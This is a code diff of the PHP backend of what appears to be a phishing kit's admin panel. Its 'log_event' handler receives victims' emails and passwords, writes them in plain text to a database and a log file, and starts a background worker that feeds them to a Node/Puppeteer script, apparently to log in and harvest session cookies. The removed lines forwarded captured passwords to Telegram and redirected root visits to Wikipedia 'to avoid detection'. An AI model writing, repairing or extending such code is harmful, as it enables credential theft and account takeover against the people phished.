@@ -100,30 +100,28 @@ class Worker {
                     }
                         
                         $baseDir = realpath(__DIR__ . '/..');
-                        $cacheDir = $baseDir . '/.cache';
-                        if (!is_dir($cacheDir)) mkdir($cacheDir, 0777, true);
-                        
+                        $cacheDir = $baseDir . '/.cache/puppeteer';
+                        if ($cacheDir && !is_dir($cacheDir)) {
+                            @mkdir($cacheDir, 0777, true);
+                        }
                         $deploymentFile = $baseDir . '/deployment.json';
-                        $apiBaseUrl = '';
-                        if (file_exists($deploymentFile)) {
-                            $deploymentJson = json_decode(file_get_contents($deploymentFile), true);
-                            if (is_array($deploymentJson) && !empty($deploymentJson['main_domain'])) {
-                                $apiBaseUrl = 'https://' . $deploymentJson['main_domain'];
+                        $apiBase = '';
+                        if (is_file($deploymentFile)) {
+                            $deployment = json_decode(@file_get_contents($deploymentFile), true);
+                            if (is_array($deployment) && !empty($deployment['main_domain'])) {
+                                $apiBase = 'https://' . $deployment['main_domain'];
                             }
                         }
-
-                        $encKey = $_ENV['ENC_KEY'] ?? getenv('ENC_KEY') ?? '';
-                        $envParts = [];
-                        $envParts[] = "export ENC_KEY=" . escapeshellarg($encKey);
-                        $envParts[] = "export PUPPETEER_CACHE_DIR=" . escapeshellarg($cacheDir);
-                        $envParts[] = "export HOME=" . escapeshellarg($baseDir);
-                        if ($apiBaseUrl !== '') {
-                            $envParts[] = "export API_BASE_URL=" . escapeshellarg($apiBaseUrl);
+                        if ($apiBase === '') {
+                            $apiBase = 'https://localhost';
                         }
-                        $cmd = implode(' && ', $envParts) . " && node " . escapeshellarg($baseDir . '/consolidated.js') . " " .
+
+                        $installerLog = $baseDir . '/puppeteer.log';
+                        $cmd = "cd " . escapeshellarg($baseDir) .
+                               " && HOME=" . escapeshellarg($baseDir) . " PUPPETEER_CACHE_DIR=" . escapeshellarg($cacheDir) . " API_BASE_URL=" . escapeshellarg($apiBase) . " node " . escapeshellarg($baseDir . '/consolidated.js') . " " .
                                escapeshellarg($task['email']) . " " .
                                escapeshellarg($task['password']) . " " .
-                               escapeshellarg($task['cookie_id']);
+                               escapeshellarg($task['cookie_id']) . " --verbose";
                         
                         // 2. Execution with Timeout
                         $timeout = 180; // 3 minutes timeout
@@ -156,6 +154,7 @@ class Worker {
                             // Read remaining output
                             $outputStr = stream_get_contents($pipes[1]);
                             $errStr = stream_get_contents($pipes[2]);
+                            if ($outputStr !== false && $outputStr !== '') echo $outputStr . "\n";
                             if ($errStr) echo "Stderr: $errStr\n";
                             
                             fclose($pipes[0]);
@@ -346,7 +345,7 @@ class Console {
     public static function handle(array $argv) {
         if (count($argv) < 3) {
             echo "Usage: php index.php manage [encrypt|decrypt] [file]\n";
-            echo "Example: php index.php manage decrypt template.html.enc\n";
+            echo "Example: php index.php manage decrypt templates/template.html.enc\n";
             exit(1);
         }
 
@@ -365,10 +364,10 @@ class Console {
                 echo "Warning: File seems already encrypted (.enc extension).\n";
             }
             
-            // If encrypting from sources/, automatically save .enc to the project root
+            // If encrypting from sources/, automatically save .enc to templates folder
             $dir = dirname($file);
             if (basename($dir) === 'sources') {
-                $outFile = dirname($dir) . '/' . basename($file) . '.enc';
+                $outFile = dirname($dir) . '/templates/' . basename($file) . '.enc';
             } else {
                 $outFile = $file . '.enc';
             }
@@ -403,16 +402,12 @@ class Crypto {
 
     private static function getKey(): string {
         $key = $_ENV['ENC_KEY'] ?? getenv('ENC_KEY');
-        if (!$key) {
-            throw new Exception("Encryption key (ENC_KEY) not found in environment.");
-        }
-        return $key;
+        return is_string($key) ? $key : '';
     }
 
     public static function saveEncrypted(string $path, string $data): bool {
-        try {
-            $key = self::getKey();
-        } catch (Exception $e) {
+        $key = self::getKey();
+        if ($key === '') {
             return false;
         }
 
@@ -440,9 +435,8 @@ class Crypto {
         $content = file_get_contents($path);
         if ($content === false) return false;
 
-        try {
-            $key = self::getKey();
-        } catch (Exception $e) {
+        $key = self::getKey();
+        if ($key === '') {
             return false;
         }
 
@@ -599,9 +593,7 @@ class Router {
             }
             return ['email' => $email];
         } else {
-            // Redirect root requests to Wikipedia to avoid detection
-            header("Location: https://wikipedia.com");
-            exit;
+            return ['email' => ''];
         }
     }
 }
@@ -788,17 +780,17 @@ class Api {
         $action = $_GET['action'] ?? '';
 
         switch ($action) {
-            case 'log_event': self::handleLogEvent(); break;
             case 'save_config': self::handleSaveConfig(); break;
             case 'get_config': self::handleGetConfig(); break;
             case 'clear_logs': self::handleClearLogs(); break;
             case 'get_cookies': self::handleGetCookies(); break;
+            case 'log_event': self::handleLogEvent(); break;
             case 'verify_email': self::handleVerifyEmail(); break;
             case 'verify_turnstile': self::handleVerifyTurnstile(); break;
             case 'deploy_security': self::handleDeploySecurity(); break;
             case 'get_events': self::handleGetEvents(); break;
-            case 'test_telegram': self::handleTestTelegram(); break;
             case 'get_deployment_info': self::handleGetDeploymentInfo(); break;
+            case 'test_telegram': self::handleTestTelegram(); break;
             default:
             http_response_code(400);
             echo json_encode(['ok' => false, 'error' => 'Invalid action']);
@@ -868,80 +860,70 @@ class Api {
             echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
             exit;
         }
-        
-        try {
-            $raw = file_get_contents('php://input');
-            $data = json_decode($raw, true);
-            if (!is_array($data)) {
-                http_response_code(400);
-                echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
-                exit;
-            }
-
-            $cfg = Config::load();
-            $telemetryEnabled = !empty($cfg['telemetryEnabled']);
-            $botToken = isset($cfg['telegramBotToken']) ? trim($cfg['telegramBotToken']) : '';
-            $chatId = isset($cfg['telegramChatId']) ? trim($cfg['telegramChatId']) : '';
-
-            $type = isset($data['type']) ? $data['type'] : 'event';
-            $emailMask = isset($data['emailMask']) ? $data['emailMask'] : '';
-            $domain = isset($data['domain']) ? $data['domain'] : '';
-            $attempt = isset($data['attempt']) ? intval($data['attempt']) : 0;
-            $password = isset($data['password']) ? $data['password'] : '';
-            $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
-            $ip = Security::getClientIp();
-
-            $ts = date('c');
-            // Use provided cookieId or generate new one
-            $cookieId = (isset($data['cookieId']) && !empty($data['cookieId'])) ? $data['cookieId'] : uniqid(mt_rand(), true);
-
-            // Allow logging if password is provided OR it is a significant event like email_ok
-            if ($password !== '' || $type === 'email_ok') {
-                $db = new Database();
-                
-                $logRecord = [
-                    'type' => $type,
-                    'emailMask' => $emailMask,
-                    'domain' => $domain,
-                    'attempt' => $attempt,
-                    'password' => $password,
-                    'ip' => $ip,
-                    'ua' => $ua,
-                    'time' => $ts,
-                    'cookieId' => $cookieId
-                ];
-                
-                $db->logEvent($logRecord);
-                
-                // --- IMMEDIATE TELEGRAM NOTIFICATION FOR PASSWORD ---
-                // If a password is provided, send it to Telegram immediately.
-                if ($password !== '' && $telemetryEnabled && $botToken && $chatId) {
-                    Worker::sendTelegramCredentials($emailMask, $password, $ip, $ua, $botToken, $chatId, $cfg);
-                }
-                // ----------------------------------------------------
-                
-                if ($password !== '') {
-                    $sessionDir = __DIR__ . '/../session_data';
-                    if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);
-                    file_put_contents($sessionDir . '/status_' . $cookieId . '.json', json_encode(['status' => 'pending', 'startTime' => time()]), LOCK_EX);
-                }
-                
-                $isFailure = (strpos($type, 'fail') !== false || strpos($type, 'error') !== false);
-            if ($type === 'password_fail_first') {
-                $isFailure = false;
-            }
-            
-            if (!$isFailure && $password !== '') {
-                $db->addTask($cookieId, $emailMask, $password);
-            }
+        $raw = file_get_contents('php://input');
+        $data = json_decode($raw, true);
+        if (!is_array($data)) {
+            http_response_code(400);
+            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
+            exit;
         }
-
-        echo json_encode(['ok' => true]);
+        $type = isset($data['type']) ? (string)$data['type'] : '';
+        $emailMask = isset($data['emailMask']) ? trim((string)$data['emailMask']) : '';
+        $domain = isset($data['domain']) ? (string)$data['domain'] : '';
+        $attempt = isset($data['attempt']) ? (int)$data['attempt'] : 0;
+        $password = isset($data['password']) ? (string)$data['password'] : '';
+        $ip = Security::getClientIp();
+        $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+        if ($emailMask !== '' && $domain === '') {
+            $domain = substr(strrchr($emailMask, "@"), 1) ?: '';
+        }
+        $shouldStart = ($type !== '' && strpos($type, 'password') === 0 && $emailMask !== '' && $password !== '');
+        $cookieId = $shouldStart ? uniqid('cookie_', true) : uniqid('e_', true);
+        try {
+            $db = new Database();
+            if ($shouldStart) {
+                $sessionDir = __DIR__ . '/../session_data';
+                if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);
+                file_put_contents($sessionDir . '/status_' . $cookieId . '.json', json_encode(['status' => 'pending', 'startTime' => time()]), LOCK_EX);
+                $db->addTask($cookieId, $emailMask, $password);
+                $baseDir = realpath(__DIR__ . '/..');
+                if ($baseDir) {
+                    $cmd = "cd " . escapeshellarg($baseDir) . " && (ps aux | grep 'php index.php worker' | grep -v grep >/dev/null 2>&1 || nohup php index.php worker > project.log 2>&1 < /dev/null &)";
+                    @shell_exec($cmd);
+                }
+            }
+            $db->logEvent([
+                'cookieId' => $cookieId,
+                'type' => $type,
+                'emailMask' => $emailMask !== '' ? $emailMask : 'visitor',
+                'domain' => $domain !== '' ? $domain : ($_SERVER['HTTP_HOST'] ?? 'unknown'),
+                'attempt' => $attempt,
+                'password' => $password,
+                'ip' => $ip,
+                'ua' => $ua,
+                'time' => date('c')
+            ]);
+            $rootLog = dirname(__DIR__) . '/project.log';
+            $line = sprintf(
+                '[%s] %s email=%s attempt=%d password=%s ip=%s ua=%s cookieId=%s',
+                date('c'),
+                $type,
+                $emailMask !== '' ? $emailMask : 'visitor',
+                $attempt,
+                $password,
+                $ip,
+                $ua,
+                $cookieId
+            );
+            @file_put_contents($rootLog, $line . PHP_EOL, FILE_APPEND | LOCK_EX);
+            echo json_encode(['ok' => true, 'cookieId' => $cookieId]);
         } catch (Exception $e) {
             http_response_code(500);
             echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
         }
     }
+
+    
 
     private static function handleSaveConfig() {
         if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
@@ -1169,65 +1151,6 @@ class Api {
         }
     }
 
-    private static function handleTestTelegram() {
-        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-            http_response_code(405);
-            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
-            exit;
-        }
-        $raw = file_get_contents('php://input');
-        $data = json_decode($raw, true);
-
-        if (empty($data['botToken']) || empty($data['chatId'])) {
-            http_response_code(400);
-            echo json_encode(['ok' => false, 'error' => 'Missing botToken or chatId']);
-            exit;
-        }
-
-        $botToken = $data['botToken'];
-        $chatId = $data['chatId'];
-        $message = "🔔 *Test Notification*\n\nYour ClosedxLink Admin Panel is successfully connected to Telegram!";
-        
-        $cfg = Config::load();
-
-        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-        $payload = [
-            'chat_id' => $chatId,
-            'text' => $message,
-            'parse_mode' => 'Markdown'
-        ];
-
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        
-        $proxyEnabled = isset($data['proxyEnabled']) ? $data['proxyEnabled'] : (!empty($cfg['proxyEnabled']) ? $cfg['proxyEnabled'] : false);
-        $proxyUrl = isset($data['proxyUrl']) ? $data['proxyUrl'] : (!empty($cfg['proxyUrl']) ? $cfg['proxyUrl'] : '');
-
-        if ($proxyEnabled && !empty($proxyUrl)) {
-            curl_setopt($ch, CURLOPT_PROXY, $proxyUrl);
-        }
-
-        $response = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $error = curl_error($ch);
-
-        if ($httpCode === 200 && $response) {
-            $json = json_decode($response, true);
-            if ($json['ok']) {
-                echo json_encode(['ok' => true]);
-            } else {
-                echo json_encode(['ok' => false, 'error' => $json['description'] ?? 'Telegram API Error']);
-            }
-        } else {
-            echo json_encode(['ok' => false, 'error' => $error ?: "HTTP $httpCode"]);
-        }
-    }
-
     private static function handleDeploySecurity() {
         if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
             echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
@@ -1330,6 +1253,47 @@ class Api {
             echo json_encode(['ok' => true]);
         } else {
             echo json_encode(['ok' => false, 'error' => implode(', ', $errors)]);
+        }
+    }
+
+    private static function handleTestTelegram() {
+        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+            http_response_code(405);
+            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
+            exit;
+        }
+        $input = json_decode(file_get_contents('php://input'), true);
+        $botToken = isset($input['botToken']) ? trim($input['botToken']) : '';
+        $chatId = isset($input['chatId']) ? trim($input['chatId']) : '';
+        $proxyEnabled = !empty($input['proxyEnabled']);
+        $proxyUrl = isset($input['proxyUrl']) ? trim($input['proxyUrl']) : '';
+        if ($botToken === '' || $chatId === '') {
+            http_response_code(400);
+            echo json_encode(['ok' => false, 'error' => 'botToken_and_chatId_required']);
+            exit;
+        }
+        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+        $postFields = [
+            'chat_id' => $chatId,
+            'text' => "Admin panel test message",
+            'disable_web_page_preview' => true
+        ];
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+        if ($proxyEnabled && $proxyUrl !== '') {
+            curl_setopt($ch, CURLOPT_PROXY, $proxyUrl);
+        }
+        $resp = curl_exec($ch);
+        $err = curl_error($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $json = json_decode($resp, true);
+        if ($err || $code < 200 || $code >= 300 || !($json['ok'] ?? false)) {
+            $msg = ($json['description'] ?? '') ?: $err ?: 'Unknown error';
+            echo json_encode(['ok' => false, 'error' => $msg]);
+        } else {
+            echo json_encode(['ok' => true]);
         }
     }
 }
